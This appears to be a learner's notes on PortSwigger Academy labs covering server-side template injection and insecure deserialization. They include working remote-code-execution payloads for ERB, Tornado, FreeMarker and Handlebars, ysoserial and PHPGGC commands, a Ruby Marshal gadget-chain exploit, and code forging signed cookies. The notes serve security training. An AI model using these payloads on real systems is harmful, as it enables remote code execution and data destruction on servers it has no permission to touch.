            [https://docs.ruby-lang.org/en/2.3.0/ERB.html](https://docs.ruby-lang.org/en/2.3.0/ERB.html)
            
        - when we click on the first article in the left (folding gadgets) we can see a message that gets reflected from the URL to the page content
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20489.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20490.png)
            
        - this helps us find the SSTI with the payload `<%= 7*7 %>`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20491.png)
            
        - since we can execute ruby command according to the documentation, we list the content of the directory of carlos using `<%= system('ls /home/carlos') %>`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20492.png)
            
        - then we delete the morale.txt file using `<%= system('rm -r /home/carlos/morale.txt ') %>` to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20493.png)
            
        
    - Basic server-side template injection (code context)
        - lab link
            
            [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
            
        - tornado template engine documentation
            
            [https://www.tornadoweb.org/en/stable/template.html](https://www.tornadoweb.org/en/stable/template.html)
            
        - While proxying traffic through Burp, log in and post a comment on one of the blog posts.
        - Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname. When you submit your choice, a `POST` request sets the value of the parameter `blog-post-author-display` to either `user.name`, `user.first_name`, or `user.nickname`. When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter.
        - intercept the request of changing the preferred name and use the payload [`user.name](http://user.name/)}}{{7*7` to check for SSTI (since clearly we’re writing inside `{{xxxxx}}`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20494.png)
            
        - we find that the name of the user has indeed changed to `49`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20495.png)
            
        - now, the goal is to execute system commands with this template (which can be tricky), and this case we used the following elements (i guess)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20496.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20497.png)
            
        - using the payload `user.first_name}}{% import os %}{{os.system("rm /home/carlos/morale.txt")` we can solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20498.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20499.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20500.png)
            
            **i guess 0 means that command got executed successfully**
            
    - Lab: Server-side template injection using documentation
        - lab link
            
            [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
            
        - we login with as content-manager with the credentials that they gave us and discover that we can edit the template of the articles in the blog (Home part)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20501.png)
            
        - Using the decision tree (check bullet above), we try identify the template  (this didn’t work)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20502.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20503.png)
            
        - Notice that this template engine uses the syntax `${someExpression}` to render the result of an expression on the page.
        - Either enter your own expression `${aaa}` or change one of the existing ones to refer to an object that doesn't exist like
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20504.png)
            
        - don’t try to use  the fuzzing payload of the course `${{<%[%'"}}%\` it didn’t help, since we know the format  is `${someExpression}` just reuse it
        - the previous test showed that **[FreeMarker Java Template Engine](https://freemarker.apache.org/)** is used, so we can use 2 methods to find the payload :
        - First method
            - try to google “SSTI in freemarker template engine” and check hacktrics
            
            According to few blogs, we can have RCE with `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}`  if there is no sandbox (which was the case in earlier versions of freemarker, like the one used in this lab  )  
            
            [**https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20505.png)
            
        - Second method
            - Study the Freemarker documentation and find that appendix contains an FAQs section with the question "Can I allow users to uploa
            - try to google “SSTI in freemarker template engine” and check hacktrics  ( FIRST METHOD )
                
                According to few blogs, we can have RCE with `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}`  if there is no sandbox (which was the case in earlier versions of freemarker, like the one used in this lab  )  
                
                [**https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection**](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20505.png)
                
            - Study the Freemarker documentation and find that appendix contains an FAQs section with the question "Can I allow users to upload templates and what are the security implications?"
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20506.png)
                
            - The answer describes how the `new()` built-in can be dangerous.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20507.png)
                
            
        - we can solve the lab with `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm -r /home/carlos/morale.txt")}`
            
            
        
    - Server-side template injection in an unknown language with a documented exploit
        - lab link
            
            [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
            
        - we start by fuzzing the application with the payload `${{<%[%'"}}%\`   to trigger an error
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20508.png)
            
        - the error shows that the application uses Handlebars template engine
        - again, using HackTricks, we found the payload to execute a system command in the target template engine
            
            ```python
            %7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
            ```
            
            [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20509.png)
            
    - Server-side template injection with information disclosure via user-supplied objects
        - lab link
            
            [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
            
        - good video solution
            
            [https://youtu.be/8o5QPU-BvFQ](https://youtu.be/8o5QPU-BvFQ)
            
        - we start by looking where our user input is reflected
        - then we fuzz the application with the payload `${{<%[%'"}}%\`   to trigger an error
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20510.png)
            
        - the error message in the output hints that the Django framework is being used.
        - my lazy approach
            - i didn’t find django payloads in Hacktrics
            - but i found payloads for Jinja which also uses python, and some of them work, in particular this selected two payloads
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20511.png)
                
            - so i used `{{settings.SECRET_KEY}}` to get the framework's secret key and solve the lab
                
                (make sure there is no spaces when submitting the key)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20512.png)
                
            - what is django’s secret key ?
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20513.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20514.png)
                
        - solution approach (better)
            - Study the Django documentation and notice that the built-in template tag `debug` can be called to display debugging information.
                
                [https://docs.djangoproject.com/en/4.2/ref/templates/builtins/](https://docs.djangoproject.com/en/4.2/ref/templates/builtins/)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20515.png)
                
            - In the template,  enter the following statement to invoke the `debug` built-in:`{% debug %}`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20516.png)
                
            - Save the template. The output will contain a list of objects and properties to which you have access from within this template.
            - Crucially, notice that you can access the `settings` object.
            - Study the `settings` object in the Django documentation and notice that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
                
                [https://docs.djangoproject.com/en/4.2/ref/settings/](https://docs.djangoproject.com/en/4.2/ref/settings/)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20517.png)
                
            - In the template, remove the `{% debug %}` statement and enter the expression `{{settings.SECRET_KEY}}`
            - Save the template to output the framework's secret key.
            - Click the "Submit solution" button and submit the secret key to solve the lab.
    
    [https://youtu.be/8o5QPU-BvFQ](https://youtu.be/8o5QPU-BvFQ)
    
- Insecure deserialization
    - hacktrics link
        
        [https://book.hacktricks.xyz/pentesting-web/deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization)
        
    - Modifying serialized objects
        - lab link
            
            [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects)
            
        - intercept request with butp >cookie looks url encoded, so url decode ⇒ looks base64 encoded, so we decode it
            
            i also found out it is URL decoded, when i tried decoding it to base64 first and i found out that the text version is not correct 
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20518.png)
            
        - screenshot from the course for understanding PHP serialization format
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20519.png)
            
        - we change the boolean value to `1` of the attribute `admin` of the object `User` in the previous decoded text, then we encode to base64
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20520.png)
            
        - we use this encoded string as the cookie of weiner to access `/admin` and delete carlos
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20521.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20522.png)
            
    - Modifying serialized data types
        - lab link
            
            [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types)
            
        - video solution
            
            [https://youtu.be/vSRMt8VlLtc](https://youtu.be/vSRMt8VlLtc)
            
        - like the previous lab : url decode ⇒ base64 decode ⇒ modify the cookie ⇒ base64 encode
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20523.png)
            
        - we should change the username to administrator and the access token (like the password) to 0
        - why ? check the course
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20524.png)
            
        - the length of the new username that we will use is the number of letters minus 1 (because php will start from 0 )
            
            so the length is 13 ! 
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20525.png)
            
            use `wc -m` and not chatgpt (it may give you a wrong number)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20526.png)
            
        - when it comes to a boolean variable or an integer, we don’t specify a length or use quotes
        - so we modify the username and the access token and re-encode the cookie
            
            ```python
            O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20527.png)
            
        - use administrative to delete carlos and solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20528.png)
            
    - Using application functionality to exploit insecure deserialization
        - lab link
            
            [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization)
            
        - as usual, we start by doing url decode and base64 decode
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20529.png)
            
        - we modify the `avatar_link` (the path of te user’s avatar) to `/home/carlos/morale.txt`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20530.png)
            
        - we use the new cookie in the delete request to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20531.png)
            
    - Arbitrary object injection in PHP
        - lab link
            
            [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
            
        - FYI, the cookie decoded looks like the previous lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20532.png)
            
        - by looking at the source code, we find a comment
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20533.png)
            
        - Hint : You can sometimes read source code by appending a tilde (`~)` to a filename to retrieve an editor-generated backup file.
        - we use this hint to access the file on the comment
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20534.png)
            
        - Since PHP has a human-readable string format for serialized data, we  create the malicious serialized manually
        - I prefer to use code to do most of the job then change some values manually if necessary
        - To use the code, we reuse the `CustomTemplate` class code and add few lines
            
            ```python
            $object = new CustomTemplate("/home/carlos/morale.txt");
            
            echo serialize($object);
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20535.png)
            
            - Reminder : you can’t set private attributes directly without a getter method (like in the line below)
                
                ```php
                $object-> lock_file_path= '/home/carlos/morale.txt';
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20536.png)
                
        - Then, we change few things
            
             `lock_file_path` to remove the extension `.lock` that was added in the constructor
            
            the names of attributes from CustomTemplatelock_file_path to `lock_file_path` 
            
            we end up with : 
            
            ```php
            O:14:"CustomTemplate":2:{s:34:"CustomTemplatetemplate_file_path";s:23:"/home/carlos/morale.txt";s:30:"CustomTemplatelock_file_path";s:28:"/home/carlos/morale.txt.lock";}
            ```
            
        - even tho, we get the following error, the deserialization was done and the file got deleted (lab solved)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20537.png)
            
        - Looking at the portswiger solution, we can see that they made the serialized object shorter by only setting the value of one attribute
            
            ```php
            O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
            ```
            
    - Exploiting Java deserialization with Apache Commons
        - lab link
            
            [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
            
        - In the descreption they tell us that the lab uses a serialization-based session mechanism and loads the Apache Commons Collections library.
        - there a pre-discovered chain in that library that can be exploited with ysoserial
        - link of ysoserial latest jar
            
            [https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
            
        - it didn’t work for me in ubuntu (some java problem) but it worked in parrot VM
        - we generate the serialized payload with ysoserial, encode it with base64 and use `-w 0` to get the output in one line
            
            ```php
            java -jar ysoserial-all.jar  CommonsCollections4  "rm /home/carlos/morale.txt" | base64 -w 0 > enc.txt
            ```
            
        - this won’t work in repeater until we URL-encode the base64 cookie (`Crtl+U`    FTW )
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20538.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20539.png)
            
    - Exploiting PHP deserialization with a pre-built gadget chain
        - lab link
            
            [https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
            
        - if we URL-decode the cookie, we find that it is signed, then we base64-decode the token to find that it is serialized
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20540.png)
            
        - looking at the source code, we find the following comment showing the path of PHP info
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20541.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20542.png)
            
        - observe that it leaks some key information about the website, including the `SECRET_KEY` environment variable. Save this key; you'll need it to sign your exploit later.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20543.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20544.png)
            
        - In Burp Repeater, observe that if you try sending a request with a modified token (the first part of the cookie visible in the previous screenshot ), an exception is raised because the digital signature no longer matches.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20545.png)
            
            However, you should notice that:The error message reveals that the website is using the Symfony 4.3.6 framework
            
        - This shows that we’re using 4.3.6 version of symfony !
        - i made the mistake of thinking it was “Zend Frameword” just because i read “Zend engine”
            - unless u read the full “Zend framework” it’s not it
            - secondly, always trigger and carefully read errors carefully !
        - Next, we use the equivalent of [ysoserial](https://github.com/frohoff/ysoserial) in PHP : **PHPGGC: PHP Generic Gadget Chains**
            
            [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20546.png)
            
            - Since we have the version 4.3.6 of symfony, i chose the following gadget chain :
            
            ```php
            ./phpggc  Symfony/RCE9 system "rm /home/carlos/morale.txt" | base64 -w 0
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20547.png)
            
        - To calculate HMAC-SHA1 using PHP, i use the following snippet
            
            ```php
            <?php
            
            $key = 'o9smgvlyigw2r0m1xzj99y9uh9t9x0vd';
            $data = 'Tzo0NDoiU3ltZm9ueVxDb21wb25lbnRcUHJvY2Vzc1xQaXBlc1xXaW5kb3dzUGlwZXMiOjE6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxQcm9jZXNzXFBpcGVzXFdpbmRvd3NQaXBlcwBmaWxlSGFuZGxlcyI7Tzo1MDoiU3ltZm9ueVxDb21wb25lbnRcRmluZGVyXEl0ZXJhdG9yXFNvcnRhYmxlSXRlcmF0b3IiOjI6e3M6NjA6IgBTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcgBpdGVyYXRvciI7TzoxMToiQXJyYXlPYmplY3QiOjQ6e2k6MDtpOjA7aToxO2E6Mjp7aTowO3M6Njoic3lzdGVtIjtpOjE7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO31pOjI7YTowOnt9aTozO047fXM6NTY6IgBTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcgBzb3J0IjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX0K';
            
            $hash = hash_hmac('sha1', $data, $key);
            
            echo $hash;
            
            ?>
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20548.png)
            
        - make sure to remove the `#` which gets added at the end of the output of the commands in your terminal
        - Finally, we URL-encode the cookie and send it in repeater to solve the lab
            - Don’t base64 another time the following content of the cookie, only url-encode it
            
            ```php
            {"token":"Tzo0NDoiU3ltZm9ueVxDb21wb25lbnRcUHJvY2Vzc1xQaXBlc1xXaW5kb3dzUGlwZXMiOjE6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxQcm9jZXNzXFBpcGVzXFdpbmRvd3NQaXBlcwBmaWxlSGFuZGxlcyI7Tzo1MDoiU3ltZm9ueVxDb21wb25lbnRcRmluZGVyXEl0ZXJhdG9yXFNvcnRhYmxlSXRlcmF0b3IiOjI6e3M6NjA6IgBTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcgBpdGVyYXRvciI7TzoxMToiQXJyYXlPYmplY3QiOjQ6e2k6MDtpOjA7aToxO2E6Mjp7aTowO3M6Njoic3lzdGVtIjtpOjE7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO31pOjI7YTowOnt9aTozO047fXM6NTY6IgBTeW1mb255XENvbXBvbmVudFxGaW5kZXJcSXRlcmF0b3JcU29ydGFibGVJdGVyYXRvcgBzb3J0IjtzOjE0OiJjYWxsX3VzZXJfZnVuYyI7fX0K","sig_hmac_sha1":"9e176e2fa2dc7cd55acfab4ee2f8ec09263d180e"}
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20549.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20550.png)
            
        - Looking at portswigger’s solution :
            - they used another gadget chain but it still worked  (also `exec` instead of `system` )
                
                ```php
                ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
                ```
                
            - they made a  good code to generate the cookie
                
                ```php
                <?php
                $object = "OBJECT-GENERATED-BY-PHPGGC";
                $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
                $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
                echo $cookie;
                ```
                
        
    - Exploiting Ruby deserialization using a documented gadget chain
        - lab link
            
            [https://0ae9001b03e4229f8139cb5800600093.web-security-academy.net/my-account?id=wiener](https://0ae9001b03e4229f8139cb5800600093.web-security-academy.net/my-account?id=wiener)
            
        - i tried googling “ruby deserialization gadget chain” and found an exploit
            
            [https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html)
            
        - the exploit use to contain payload.load which triggers an error (i guess because it deserialize the object which doesn’t work )
        - if you get the error “exploit.rb:38:in `<main>': uninitialized constant Base64 (NameError)”
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20551.png)
            
        - we do the following changes in the exploit
            - we change the system command from `id` in the exploit
            - we add `require 'base64’` in the top
            - we remove the `load` because we only want the serialized version
            - we base64 encode the payload at the end. Note that the raw version of the payload can be printed with `puts payload`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20552.png)
                
            - Don’t try to print `payload.inspect` and try to base64 encode it manually later. we need to base64 to raw payload
            
        - we end up with the following exploit
            
            ```ruby
            # Autoload the required classes
            require 'base64'
            
            Gem::SpecFetcher
            Gem::Installer
            
            # prevent the payload from running when we Marshal.dump it
            module Gem
              class Requirement
                def marshal_dump
                  [@requirements]
                end
              end
            end
            
            wa1 = Net::WriteAdapter.new(Kernel, :system)
            
            rs = Gem::RequestSet.allocate
            rs.instance_variable_set('@sets', wa1)
            rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")
            
            wa2 = Net::WriteAdapter.new(rs, :resolve)
            
            i = Gem::Package::TarReader::Entry.allocate
            i.instance_variable_set('@read', 0)
            i.instance_variable_set('@header', "aaa")
            
            n = Net::BufferedIO.allocate
            n.instance_variable_set('@io', i)
            n.instance_variable_set('@debug_output', wa2)
            
            t = Gem::Package::TarReader.allocate
            t.instance_variable_set('@io', n)
            
            r = Gem::Requirement.allocate
            r.instance_variable_set('@requirements', t)
            
            payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
            puts Base64.encode64(payload)
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20553.png)
            
        - to compile ruby, you can use an online website like the one inside
            
            [https://www.onlinegdb.com/online_ruby_compiler](https://www.onlinegdb.com/online_ruby_compiler)
            
        - we remove line breaks from out output,
            
            ```ruby
            echo "BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06       
            OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
            b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
            ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
            YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
            bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
            aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
            LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==" | tr -d "\n\r"
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20554.png)
            
        - we url encode the result and send it in repeater to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20555.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20556.png)
            
- GraphQL API
    - Accessing private GraphQL postsSubmit solution
        - lab link
            
            [https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
            
        - Like requested by the lab description, we install the InQL extension
            
